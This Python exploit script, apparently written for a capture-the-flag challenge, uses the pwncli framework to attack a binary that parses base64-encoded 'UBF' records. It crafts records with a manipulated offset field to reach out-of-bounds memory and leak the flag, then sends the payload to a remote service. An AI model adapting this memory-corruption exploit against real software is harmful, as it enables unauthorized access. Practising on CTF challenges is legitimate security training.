#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
import base64
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def generate_payload(size, choice, x1, x2, data):
    payload  = p32(size)
    payload += choice
    payload += p16(x1)
    payload += p16(x2)
    payload += data
    return payload

payload = generate_payload(5, b's', 1, 2, p16(5) + b"$FLAG")
payload+= generate_payload(0x100, b'b', 1, 0x10000 - (0x6b), b"\x01")

ru(b'Enter UBF data base64 encoded:\n')
sl(base64.b64encode(payload))

ia()
